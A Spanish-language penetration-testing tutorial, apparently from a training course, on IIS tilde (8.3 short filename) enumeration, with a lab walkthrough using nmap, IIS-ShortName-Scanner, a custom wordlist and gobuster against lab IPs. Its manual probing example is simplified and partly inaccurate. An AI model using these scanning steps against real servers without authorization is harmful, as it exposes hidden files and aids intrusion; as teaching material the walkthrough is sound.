La enumeración de directorios con tilde en IIS es una técnica utilizada para descubrir archivos ocultos, directorios y nombres de archivo cortos (también conocidos como formato `8.3`) en algunas versiones de los servidores web Microsoft Internet Information Services (IIS). Este método aprovecha una vulnerabilidad específica en IIS, derivada de cómo maneja los nombres de archivo cortos dentro de sus directorios.

Cuando se crea un archivo o carpeta en un servidor IIS, Windows genera un nombre de archivo corto en el formato `8.3`, que consiste en ocho caracteres para el nombre del archivo, un punto y tres caracteres para la extensión. Curiosamente, estos nombres de archivo cortos pueden otorgar acceso a sus archivos y carpetas correspondientes, incluso si se suponía que estaban ocultos o inaccesibles.

El carácter tilde (`~`), seguido de un número de secuencia, significa un nombre de archivo corto en una URL. Por lo tanto, si alguien determina un nombre de archivo corto o de carpeta, puede explotar el carácter tilde y el nombre de archivo corto en la URL para acceder a datos sensibles o recursos ocultos.

La enumeración de directorios con tilde en IIS implica principalmente enviar solicitudes HTTP al servidor con combinaciones de caracteres distintas en la URL para identificar nombres de archivo cortos válidos. Una vez que se detecta un nombre de archivo corto válido, esta información puede ser utilizada para acceder al recurso relevante o enumerar más la estructura del directorio.

El proceso de enumeración comienza enviando solicitudes con varios caracteres siguiendo la tilde:

```r
http://example.com/~a
http://example.com/~b
http://example.com/~c
...
```

Supongamos que el servidor contiene un directorio oculto llamado SecretDocuments. Cuando se envía una solicitud a `http://example.com/~s`, el servidor responde con un código de estado `200 OK`, revelando un directorio con un nombre corto que comienza con "s". El proceso de enumeración continúa agregando más caracteres:

```r
http://example.com/~se
http://example.com/~sf
http://example.com/~sg
...
```

Para la solicitud `http://example.com/~se`, el servidor devuelve un código de estado `200 OK`, refinando aún más el nombre corto a "se". Se envían más solicitudes, como:

```r
http://example.com/~sec
http://example.com/~sed
http://example.com/~see
...
```

El servidor entrega un código de estado `200 OK` para la solicitud `http://example.com/~sec`, reduciendo aún más el nombre corto a "sec".

Continuando con este procedimiento, el nombre corto `secret~1` se descubre eventualmente cuando el servidor devuelve un código de estado `200 OK` para la solicitud `http://example.com/~secret`.

Una vez que se identifica el nombre corto `secret~1`, se puede realizar la enumeración de nombres de archivos específicos dentro de esa ruta, lo que potencialmente expone documentos sensibles.

Por ejemplo, si se determina el nombre corto `secret~1` para el directorio oculto SecretDocuments, se pueden acceder a los archivos en ese directorio enviando solicitudes como:

```r
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/anotherfile.docx
```

La misma técnica de enumeración de directorios con tilde en IIS también puede detectar nombres de archivo cortos en formato 8.3 para archivos dentro del directorio. Después de obtener los nombres cortos, esos archivos pueden ser accedidos directamente utilizando los nombres cortos en las solicitudes.

```r
http://example.com/secret~1/somefi~1.txt
```

En los nombres de archivo cortos en formato 8.3, como `somefi~1.txt`, el número "1" es un identificador único que distingue los archivos con nombres similares dentro del mismo directorio. Los números que siguen a la tilde (`~`) ayudan al sistema de archivos a diferenciar entre archivos que comparten similitudes en sus nombres, asegurando que cada archivo tenga un nombre corto 8.3 distinto.

Por ejemplo, si existen dos archivos llamados `somefile.txt` y `somefile1.txt` en el mismo directorio, sus nombres cortos 8.3 serían:

- `somefi~1.txt` para `somefile.txt`
- `somefi~2.txt` para `somefile1.txt`

---

## Enumeration

La fase inicial implica mapear el objetivo y determinar qué servicios están operando en sus respectivos puertos.

### Nmap - Open ports

```r
nmap -p- -sV -sC --open 10.129.224.91

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-14 19:44 GMT
Nmap scan report for 10.129.224.91
Host is up (0.011s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.38 seconds

```

IIS 7.5 está ejecutándose en el puerto 80. Ejecutar un ataque de enumeración con tilde en esta versión podría ser una opción viable.

### Tilde Enumeration using IIS ShortName Scanner

Enviar manualmente solicitudes HTTP para cada letra del alfabeto puede ser un proceso tedioso. Afortunadamente, existe una herramienta llamada `IIS-ShortName-Scanner` que puede automatizar esta tarea. Puedes encontrarla en GitHub en el siguiente enlace: [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner). Para usar `IIS-ShortName-Scanner`, necesitarás instalar Oracle Java en Pwnbox o tu VM local. Los detalles se pueden encontrar en el siguiente enlace: [How to Install Oracle Java](https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/)

Cuando ejecutes el siguiente comando, te pedirá un proxy, solo presiona enter para No.

```r
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Do you want to use proxy [Y=Yes, Anything Else=No]? 
# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```

Al ejecutar la herramienta, descubre 2 directorios y 3 archivos. Sin embargo, el objetivo no permite el acceso `GET` a `http://10.129.204.231/TRANSF~1.ASP`, lo que requiere forzar el nombre de archivo restante.

### Generate Wordlist

La imagen de pwnbox ofrece una amplia colección de listas de palabras ubicadas en el directorio `/usr/share/wordlists/`, que se pueden utilizar para este propósito.

```r
egrep -r ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt
```

Este comando combina `egrep` y `sed` para filtrar y modificar el contenido de los archivos de entrada, luego guarda los resultados en un nuevo archivo.

|**Parte del Comando**| **Descripción**                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
|---|---|
|`egrep -r ^transf`| El comando `egrep` se usa para buscar líneas que contienen un patrón específico en los archivos de entrada. La flag `-r` indica una búsqueda recursiva a través de directorios. El patrón `^transf` coincide con cualquier línea que comience con "transf". La salida de este comando serán líneas que comienzan con "transf" junto con los nombres de sus archivos fuente.                                                                                                |
|`\|`| El símbolo de tubería (`\|`) se utiliza para pasar la salida del primer comando (`egrep`) al segundo comando (`sed`). En este caso, las líneas que comienzan con "transf" y sus nombres de archivo serán la entrada para el comando `sed`.                                                                                                                                                                                                                                 |
|`sed 's/^[^:]*://'`| El comando `sed` se usa para realizar una operación de búsqueda y reemplazo en su entrada (en este caso, la salida de `egrep`). La expresión `'s/^[^:]*://'` le dice a `sed` que busque cualquier secuencia de caracteres al comienzo de una línea (`^`) hasta el primer dos puntos (`:`), y reemplácelos con nada (eliminando efectivamente el texto coincidente). El resultado serán las líneas que comienzan con "transf" pero sin los nombres de archivo y dos puntos. |
|`> /tmp/list.txt`| El símbolo mayor que (`>`) se usa para redirigir la salida de todo el comando (es decir, las líneas modificadas) a un nuevo archivo llamado `/tmp/list.txt`.                                                                                                                                                                                                                                                                                                               |

### Gobuster Enumeration

Una vez que hayas creado la lista de palabras personalizada, puedes usar `gobuster` para enumerar todos los elementos en el objetivo. GoBuster es una herramienta de fuerza bruta de archivos y directorios de código abierto escrita en el lenguaje de programación Go. Está diseñada para pentesters y profesionales de la seguridad para ayudar a identificar y descubrir archivos ocultos, directorios o recursos en servidores web durante evaluaciones de seguridad.

```r
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /tmp/list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              asp,aspx
[+] Timeout:                 10s
===============================================================
2023/03/23 15:14:05 Starting gobuster in directory enumeration mode
===============================================================
/transf**.aspx        (Status: 200) [Size: 941]
Progress: 306 / 309 (99.03%)
===============================================================
2023/03/23 15:14:11 Finished
===============================================================
```

De la salida redactada, puedes ver que `gobuster` ha identificado con éxito un archivo `.aspx` como el nombre de archivo completo correspondiente al nombre corto previamente descubierto `TRANSF~1.ASP`.